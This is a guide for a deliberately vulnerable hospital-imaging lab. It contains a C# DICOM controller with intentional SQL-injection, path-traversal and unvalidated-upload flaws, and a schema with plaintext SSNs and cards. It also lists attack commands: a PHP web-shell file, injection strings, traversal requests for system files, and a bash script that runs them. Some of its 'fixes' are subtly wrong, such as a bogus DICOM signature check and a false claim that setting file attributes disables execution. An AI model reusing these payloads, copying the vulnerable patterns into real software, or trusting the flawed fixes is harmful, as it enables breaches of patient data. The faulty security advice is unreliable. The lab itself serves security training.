# 🏥 Healthcare & DICOM Extension - Factory Lab

**Hospital simulation with DICOM medical imaging, insecure data handling, and healthcare security vulnerabilities**

---

## Overview

This extension adds healthcare systems to Factory Lab:

- **50 Hospital Employees** (Doctors, Nurses, Technicians, Administrators)
- **DICOM Server** for medical imaging (intentionally vulnerable for testing)
- **Electronic Health Records (EHR)** database
- **Patient Records Management** system
- **Medical Imaging System** (insecure DICOM upload/download)
- **Intentional Security Vulnerabilities** for defensive security training:
  - Unvalidated DICOM file uploads
  - SQL injection in patient search
  - Path traversal in image access
  - Missing authentication checks
  - Insufficient HIPAA compliance

---

## Hospital Infrastructure

### Active Directory Department Structure

Add to factory.local domain:

```
OU=Hospital,DC=factory,DC=local
├── OU=Physicians (8)
│   ├── Radiologists (2)
│   ├── Cardiologists (2)
│   ├── General Practitioners (3)
│   └─ Chief Medical Officer (1)
│
├── OU=Nursing (15)
│   ├─ Nurses (10)
│   ├─ Nurse Leads (3)
│   └─ Charge Nurse (2)
│
├── OU=Radiology (8)
│   ├─ Radiologic Technologists (5)
│   ├─ PACS Administrators (2)
│   └─ Chief Radiologist (1)
│
├── OU=Administration (12)
│   ├─ Medical Records (4)
│   ├─ Patient Intake (3)
│   ├─ Billing (3)
│   └─ IT Support (2)
│
└── OU=Lab & Pathology (7)
    ├─ Lab Technicians (5)
    └─ Pathologists (2)
```

### Database Schema - Hospital

**Add to SQL Server Manufacturing database:**

```sql
-- Hospital Module
CREATE SCHEMA [Hospital]
GO

-- Patients Table
CREATE TABLE [Hospital].[Patients] (
    [PatientID] INT PRIMARY KEY IDENTITY(1,1),
    [MRN] VARCHAR(20) UNIQUE,  -- Medical Record Number
    [FirstName] VARCHAR(100),
    [LastName] VARCHAR(100),
    [DOB] DATE,
    [Gender] CHAR(1),
    [PhoneNumber] VARCHAR(20),
    [EmailAddress] VARCHAR(100),
    [InsuranceID] VARCHAR(50),
    [CreatedDate] DATETIME DEFAULT GETDATE(),
    
    -- VULNERABILITY: No encryption
    [SSN] VARCHAR(11),  -- Should NOT be stored in plaintext!
    [CreditCard] VARCHAR(20)  -- Should NOT be stored in plaintext!
)

-- Medical Encounters
CREATE TABLE [Hospital].[Encounters] (
    [EncounterID] INT PRIMARY KEY IDENTITY(1,1),
    [PatientID] INT REFERENCES [Hospital].[Patients]([PatientID]),
    [EncounterDate] DATETIME,
    [EncounterType] VARCHAR(50),
    [Chief_Complaint] VARCHAR(MAX),
    [Assessment] VARCHAR(MAX),
    [Plan] VARCHAR(MAX),
    [Physician_ID] VARCHAR(100),
    [CreatedDate] DATETIME DEFAULT GETDATE()
)

-- Lab Results
CREATE TABLE [Hospital].[LabResults] (
    [LabID] INT PRIMARY KEY IDENTITY(1,1),
    [PatientID] INT REFERENCES [Hospital].[Patients]([PatientID]),
    [TestName] VARCHAR(100),
    [Result] VARCHAR(100),
    [RefRange] VARCHAR(50),
    [Flag] VARCHAR(20),  -- 'H', 'L', 'Normal'
    [ResultDate] DATETIME DEFAULT GETDATE()
)

-- DICOM Images (Medical Imaging)
CREATE TABLE [Hospital].[DICOMImages] (
    [ImageID] INT PRIMARY KEY IDENTITY(1,1),
    [PatientID] INT REFERENCES [Hospital].[Patients]([PatientID]),
    [StudyInstanceUID] VARCHAR(100),
    [SeriesInstanceUID] VARCHAR(100),
    [SOPInstanceUID] VARCHAR(100),
    [Modality] VARCHAR(20),  -- 'CT', 'MRI', 'XR', 'US', etc.
    [StudyDate] DATE,
    [Description] VARCHAR(MAX),
    [FilePath] VARCHAR(500),
    
    -- VULNERABILITY: Stores filepath, accessible via path traversal
    [FileSize] BIGINT,
    [CreatedDate] DATETIME DEFAULT GETDATE()
)

-- Prescriptions
CREATE TABLE [Hospital].[Prescriptions] (
    [RxID] INT PRIMARY KEY IDENTITY(1,1),
    [PatientID] INT REFERENCES [Hospital].[Patients]([PatientID]),
    [MedicationName] VARCHAR(100),
    [Dosage] VARCHAR(50),
    [Frequency] VARCHAR(50),
    [Quantity] INT,
    [Refills] INT,
    [PrescriberID] VARCHAR(100),
    [PrescribeDate] DATETIME DEFAULT GETDATE()
)

-- HIPAA Audit Trail (VULNERABLE: Incomplete logging)
CREATE TABLE [Hospital].[AuditLog] (
    [LogID] BIGINT PRIMARY KEY IDENTITY(1,1),
    [UserID] VARCHAR(100),
    [ActionType] VARCHAR(50),  -- 'VIEW_PATIENT', 'EDIT_RECORD', 'DOWNLOAD_IMAGE'
    [PatientID] INT,
    [Details] VARCHAR(MAX),
    [Timestamp] DATETIME DEFAULT GETDATE(),
    
    -- VULNERABILITY: Not all access logged, no encryption
    [IPAddress] VARCHAR(50)  -- Unreliable, client-side sourced
)

-- Insert sample patients
INSERT INTO [Hospital].[Patients] 
(MRN, FirstName, LastName, DOB, Gender, SSN, CreditCard)
VALUES
('000001', 'John', 'Smith', '1965-03-15', 'M', '123-45-6789', '4532-1111-2222-3333'),
('000002', 'Jane', 'Doe', '1978-07-22', 'F', '987-65-4321', '5678-9012-3456-7890'),
-- Add 48 more sample patients...
GO
```

---

## DICOM Server - Vulnerable Implementation

### DICOM Upload Endpoint (ASP.NET - VULNERABLE)

```csharp
// C:\Hospital\DICOM\DicomUploadController.cs
// INTENTIONALLY VULNERABLE FOR TESTING

using Microsoft.AspNetCore.Mvc;
using System.IO;
using System;
using System.Data.SqlClient;

[ApiController]
[Route("api/dicom")]
public class DicomUploadController : ControllerBase
{
    private const string DicomStoragePath = @"D:\Hospital\DICOM_Images";
    private const string ConnectionString = 
        @"Server=FACTORY-SQL\MSSQLSERVER;Database=Manufacturing;Integrated Security=true;";

    // VULNERABILITY #1: No file type validation
    // VULNERABILITY #2: No file size limits
    // VULNERABILITY #3: Predictable path construction
    [HttpPost("upload")]
    public async Task<ActionResult> UploadDicom(IFormFile file)
    {
        if (file == null || file.Length == 0)
            return BadRequest("No file uploaded");

        // VULNERABILITY: No validation of file extension or MIME type
        var fileName = file.FileName;  // VULNERABLE: Uses original filename
        var filePath = Path.Combine(DicomStoragePath, fileName);

        // VULNERABILITY: No path traversal check
        // User could upload "../../windows/system32/evil.exe"
        
        try
        {
            using (var stream = System.IO.File.Create(filePath))
            {
                await file.CopyToAsync(stream);
            }

            // VULNERABILITY: Stores exact filepath in database
            using (SqlConnection conn = new SqlConnection(ConnectionString))
            {
                await conn.OpenAsync();
                SqlCommand cmd = new SqlCommand(
                    @"INSERT INTO [Hospital].[DICOMImages] 
                      (PatientID, StudyDate, FilePath, FileSize)
                      VALUES (@patientID, @studyDate, @filePath, @fileSize)",
                    conn);

                cmd.Parameters.AddWithValue("@patientID", User.FindFirst("PatientID")?.Value ?? "0");
                cmd.Parameters.AddWithValue("@studyDate", DateTime.Now);
                cmd.Parameters.AddWithValue("@filePath", filePath);  // VULNERABLE
                cmd.Parameters.AddWithValue("@fileSize", file.Length);

                await cmd.ExecuteNonQueryAsync();
            }

            return Ok(new { message = "File uploaded", path = filePath });
        }
        catch (Exception ex)
        {
            // VULNERABILITY: Error messages leak system paths
            return BadRequest($"Error: {ex.Message} at {ex.StackTrace}");
        }
    }

    // VULNERABILITY #4: SQL Injection
    [HttpGet("search")]
    public async Task<ActionResult> SearchPatient(string patientName)
    {
        // VULNERABLE: No parameterized queries
        string query = $@"SELECT * FROM [Hospital].[Patients] 
                         WHERE FirstName LIKE '%{patientName}%' 
                         OR LastName LIKE '%{patientName}%'";

        using (SqlConnection conn = new SqlConnection(ConnectionString))
        {
            await conn.OpenAsync();
            // VULNERABLE: Direct string concatenation (SQL injection)
            SqlCommand cmd = new SqlCommand(query, conn);
            
            using (SqlDataReader reader = await cmd.ExecuteReaderAsync())
            {
                var results = new List<object>();
                while (await reader.ReadAsync())
                {
                    results.Add(new {
                        // VULNERABILITY: Returns SSN and credit card in plaintext
                        id = reader["PatientID"],
                        name = $"{reader["FirstName"]} {reader["LastName"]}",
                        ssn = reader["SSN"],  // SHOULD NOT EXPOSE!
                        creditCard = reader["CreditCard"]  // SHOULD NOT EXPOSE!
                    });
                }
                return Ok(results);
            }
        }
    }

    // VULNERABILITY #5: Path Traversal
    // VULNERABILITY #6: No authentication checks
    [HttpGet("download")]
    public FileResult DownloadImage(string imageId)
    {
        // VULNERABLE: No validation that user owns this image
        // VULNERABLE: No check if user is authenticated
        // VULNERABLE: imageId could be exploited for path traversal

        using (SqlConnection conn = new SqlConnection(ConnectionString))
        {
            conn.Open();
            
            // VULNERABLE: No parameterized query
            SqlCommand cmd = new SqlCommand(
                $"SELECT FilePath FROM [Hospital].[DICOMImages] WHERE ImageID = {imageId}",
                conn);
            
            var filePath = (string)cmd.ExecuteScalar();
            
            // VULNERABLE: No validation of filePath
            // Could be: "../../windows/system32/drivers/etc/hosts"
            
            var fileStream = System.IO.File.OpenRead(filePath);
            return File(fileStream, "application/octet-stream");
        }
    }

    // VULNERABLE: Missing authentication
    // VULNERABLE: No HIPAA audit logging
    // VULNERABLE: No access control enforcement
}
```

---

## Intentional Vulnerabilities for Testing

### Vulnerability Matrix

| # | Vulnerability | OWASP | Severity | Location |
|---|---|---|---|---|
| 1 | Unvalidated File Upload | A4:2021 | **CRITICAL** | DicomUploadController.UploadDicom() |
| 2 | SQL Injection | A3:2021 | **CRITICAL** | DicomUploadController.SearchPatient() |
| 3 | Path Traversal | A1:2021 | **HIGH** | DicomUploadController.DownloadImage() |
| 4 | Broken Authentication | A7:2021 | **CRITICAL** | All endpoints |
| 5 | PII Exposure (SSN, CC) | A1:2021 | **CRITICAL** | Patients table |
| 6 | Insufficient Logging | A9:2021 | **HIGH** | AuditLog table |
| 7 | Error Message Disclosure | A5:2021 | **MEDIUM** | Exception handling |
| 8 | Plaintext Storage | A2:2021 | **CRITICAL** | Database storage |
| 9 | Missing Access Control | A1:2021 | **CRITICAL** | All endpoints |
| 10 | No HIPAA Compliance | Legal | **CRITICAL** | Entire system |

---

## Defensive Security Testing Scenarios

### Scenario 1: DICOM Injection Attack

**Objective:** Upload malicious DICOM file

```bash
# Attacker creates malicious file
echo "<?php system(\$_GET['cmd']); ?>" > malicious.dcm

# Upload via unvalidated endpoint
curl -F "file=@malicious.dcm" http://localhost:8000/api/dicom/upload

# Now can access web shell
curl "http://localhost:8000/malicious.dcm?cmd=whoami"
```

**How to Prevent:**
```csharp
// 1. Validate file extension
if (!Path.GetExtension(file.FileName).Equals(".dcm", StringComparison.OrdinalIgnoreCase))
    return BadRequest("Only .dcm files allowed");

// 2. Validate DICOM signature
byte[] dicomHeader = new byte[4];
using (var reader = new BinaryReader(file.OpenReadStream()))
{
    reader.Read(dicomHeader, 0, 4);
}
if (dicomHeader[0] != 0x28 || dicomHeader[1] != 0x00 || 
    dicomHeader[2] != 0x00 || dicomHeader[3] != 0x00)
    return BadRequest("Invalid DICOM file");

// 3. Store in isolated directory (not web-accessible)
string safeFileName = Guid.NewGuid().ToString() + ".dcm";
var safePath = Path.Combine(DicomStoragePath, safeFileName);

// 4. Disable execution permissions
File.SetAttributes(safePath, FileAttributes.Normal);
```

### Scenario 2: SQL Injection in Patient Search

**Objective:** Extract all patient records including SSN

```sql
-- Attacker input
' OR '1'='1

-- Resulting query (VULNERABLE)
SELECT * FROM [Hospital].[Patients] 
WHERE FirstName LIKE '%' OR '1'='1%' 
OR LastName LIKE '%' OR '1'='1%'

-- Returns ALL patients with SSN and credit cards exposed!
```

**How to Prevent:**
```csharp
// Use parameterized queries
using (SqlConnection conn = new SqlConnection(ConnectionString))
{
    await conn.OpenAsync();
    
    // SAFE: Parameterized query
    SqlCommand cmd = new SqlCommand(
        @"SELECT PatientID, FirstName, LastName FROM [Hospital].[Patients] 
          WHERE FirstName LIKE @searchTerm OR LastName LIKE @searchTerm",
        conn);
    
    cmd.Parameters.AddWithValue("@searchTerm", $"%{patientName}%");
    
    using (SqlDataReader reader = await cmd.ExecuteReaderAsync())
    {
        // Process safely
    }
}
```

### Scenario 3: Path Traversal in Image Download

**Objective:** Access files outside DICOM directory

```bash
# Attacker request with path traversal
curl "http://localhost:8000/api/dicom/download?imageId=1 UNION SELECT '../../windows/system32/sam'"

# Or try to access Windows registry
curl "http://localhost:8000/api/dicom/download?imageId=1 OR 1=1 --"
```

**How to Prevent:**
```csharp
// Validate and sanitize paths
string basePath = Path.GetFullPath(DicomStoragePath);
string filePath = Path.GetFullPath(pathFromDatabase);

// Ensure file is within allowed directory
if (!filePath.StartsWith(basePath))
    return BadRequest("Access denied");

if (!System.IO.File.Exists(filePath))
    return NotFound();

return File(System.IO.File.OpenRead(filePath), "application/octet-stream");
```

### Scenario 4: HIPAA Violation - Unauthorized Access

**Objective:** View patient records without authorization

```
Problem:
- No authentication enforced
- No access control checks
- No audit logging

Attack:
GET /api/patients/search?name=john → Returns all Johns' records
GET /api/dicom/download?imageId=1 → Downloads any image

Solution:
✓ Require [Authorize] attribute
✓ Check user's department access
✓ Implement audit logging
✓ HIPAA-compliant encryption
```

---

## HIPAA Compliance Implementation

### Correct DICOM Upload (HIPAA-Compliant)

```csharp
[Authorize(Roles = "Radiologist,Radiology-Tech")]
[HttpPost("dicom/upload")]
public async Task<ActionResult> UploadDicomSecure(IFormFile file, int patientId)
{
    // 1. AUTHENTICATION: Verify user identity
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    if (string.IsNullOrEmpty(userId))
        return Unauthorized();

    // 2. AUTHORIZATION: Check if user can access this patient
    var canAccess = await VerifyPatientAccess(userId, patientId);
    if (!canAccess)
        return Forbid("No access to this patient");

    // 3. VALIDATION: Check file
    if (file.Length > 500 * 1024 * 1024)  // 500MB max
        return BadRequest("File too large");

    if (!file.ContentType.Contains("dicom"))
        return BadRequest("Invalid DICOM file");

    // 4. ENCRYPTION: Store encrypted
    byte[] fileBytes;
    using (var ms = new MemoryStream())
    {
        await file.CopyToAsync(ms);
        fileBytes = ms.ToArray();
    }

    // Encrypt before storage
    byte[] encryptedBytes = EncryptData(fileBytes);
    string encryptedFileName = Guid.NewGuid().ToString();
    var encryptedPath = Path.Combine(DicomEncryptedPath, encryptedFileName);

    System.IO.File.WriteAllBytes(encryptedPath, encryptedBytes);

    // 5. AUDIT LOGGING: Log all access
    await LogHIPAAEvent(new HIPAALog
    {
        UserID = userId,
        ActionType = "DICOM_UPLOAD",
        PatientID = patientId,
        Timestamp = DateTime.UtcNow,
        IPAddress = Request.HttpContext.Connection.RemoteIpAddress.ToString(),
        Status = "Success"
    });

    return Ok("DICOM uploaded securely");
}

private async Task<bool> VerifyPatientAccess(string userId, int patientId)
{
    // Check if user's department can access this patient
    var userDept = await GetUserDepartment(userId);
    var patientDept = await GetPatientOwningDept(patientId);
    
    return userDept == patientDept || userDept == "Administration";
}

private async Task LogHIPAAEvent(HIPAALog log)
{
    using (SqlConnection conn = new SqlConnection(ConnectionString))
    {
        await conn.OpenAsync();
        SqlCommand cmd = new SqlCommand(
            @"INSERT INTO [Hospital].[AuditLog] 
              (UserID, ActionType, PatientID, Timestamp, IPAddress)
              VALUES (@userID, @actionType, @patientID, @timestamp, @ipAddress)",
            conn);

        cmd.Parameters.AddWithValue("@userID", log.UserID);
        cmd.Parameters.AddWithValue("@actionType", log.ActionType);
        cmd.Parameters.AddWithValue("@patientID", log.PatientID);
        cmd.Parameters.AddWithValue("@timestamp", log.Timestamp);
        cmd.Parameters.AddWithValue("@ipAddress", log.IPAddress);

        await cmd.ExecuteNonQueryAsync();
    }
}
```

---

## Deployment Instructions

### Add to Windows Factory Lab

**Step 1: Extend Active Directory**

```powershell
# Create Hospital OUs
$departments = @("Physicians", "Nursing", "Radiology", "Administration", "Lab & Pathology")
foreach ($dept in $departments) {
    New-ADOrganizationalUnit -Name $dept `
        -Path "OU=Hospital,DC=factory,DC=local"
}

# Create 50 hospital employees (similar to factory)
```

**Step 2: Create DICOM Storage**

```powershell
# On FACTORY-FS
mkdir D:\Hospital\DICOM_Images
mkdir D:\Hospital\DICOM_Encrypted
mkdir D:\Hospital\DICOM_Backups

# Set restrictive permissions
icacls "D:\Hospital\DICOM_Images" /grant "FACTORY\Radiologists:(OI)(CI)F"
icacls "D:\Hospital\DICOM_Images" /inheritance:d
```

**Step 3: Deploy DICOM Server**

```powershell
# Build and deploy DICOM service
# Add to FACTORY-MES IIS
# Map port 8000/dicom for DICOM endpoints
```

**Step 4: Load Hospital Database**

```sql
-- On FACTORY-SQL
-- Run hospital schema creation
-- Insert 50 sample patients
-- Setup audit logging
```

---

## Testing & Exploitation

### Vulnerability Scanner

```bash
#!/bin/bash
# test-hospital-security.sh

# Test 1: DICOM Upload Validation
echo "Testing DICOM upload validation..."
echo "<?php system($_GET['cmd']); ?>" > malicious.dcm
curl -F "file=@malicious.dcm" http://localhost:8000/api/dicom/upload

# Test 2: SQL Injection
echo "Testing SQL injection..."
curl "http://localhost:8000/api/dicom/search?patientName=' OR '1'='1"

# Test 3: Path Traversal
echo "Testing path traversal..."
curl "http://localhost:8000/api/dicom/download?imageId=1 UNION SELECT '../../windows/win.ini'"

# Test 4: Authentication Bypass
echo "Testing auth bypass..."
curl "http://localhost:8000/api/patients/list" # Should require auth

# Test 5: HIPAA Audit Logging
echo "Checking audit log coverage..."
curl "http://localhost:8000/api/dicom/download?imageId=1"
sqlcmd -S FACTORY-SQL -d Manufacturing -Q "SELECT COUNT(*) FROM [Hospital].[AuditLog]"
```

---

## Security Training Scenarios

### Scenario A: Red Team - Exploit All 10 Vulnerabilities
- [ ] Successfully upload malicious DICOM
- [ ] Inject SQL to extract all patient SSN
- [ ] Use path traversal to read system files
- [ ] Access records without authentication
- [ ] Retrieve plaintext credit cards
- [ ] Bypass access controls
- [ ] Disable audit logging

### Scenario B: Blue Team - Secure the System
- [ ] Fix DICOM upload validation
- [ ] Implement parameterized SQL queries
- [ ] Protect against path traversal
- [ ] Add authentication to all endpoints
- [ ] Encrypt PII at rest
- [ ] Implement access controls
- [ ] Enable HIPAA audit logging

### Scenario C: Compliance Audit
- [ ] Verify HIPAA compliance
- [ ] Check for unauthorized access
- [ ] Review audit logs for 6 months
- [ ] Verify encryption of patient data
- [ ] Check backup procedures
- [ ] Verify disaster recovery plan

---

## Production Hardening

✅ Enable .NET Core security headers
✅ Implement HIPAA-compliant audit logging
✅ Encrypt all PII (SSN, Credit Cards, Medical Records)
✅ Use Windows Certificate Authority for TLS
✅ Implement role-based access control (RBAC)
✅ Use SQL Server Transparent Data Encryption (TDE)
✅ Implement DICOM encryption in transit
✅ Setup Windows Event Forwarding to SIEM
✅ Enable MFA for all users
✅ Regular vulnerability scanning
✅ Penetration testing
✅ HIPAA compliance certification

---

## Files Included

- `hospital-schema.sql` - Database schema with vulnerabilities
- `DicomUploadController.cs` - Vulnerable DICOM upload code
- `DicomUploadController-Secure.cs` - Fixed secure version
- `test-hospital-security.sh` - Security testing script
- `hospital-users.csv` - 50 hospital employees
- `hipaa-audit-config.ps1` - HIPAA compliance setup

---

This healthcare extension provides:
✅ Realistic hospital simulation
✅ 10 intentional security vulnerabilities (OWASP Top 10)
✅ DICOM medical imaging system
✅ HIPAA compliance scenarios
✅ Secure vs. vulnerable code examples
✅ Red team attack scenarios
✅ Blue team defense scenarios
✅ Compliance audit procedures

Perfect for **defensive security training** and **healthcare cybersecurity** education! 🏥
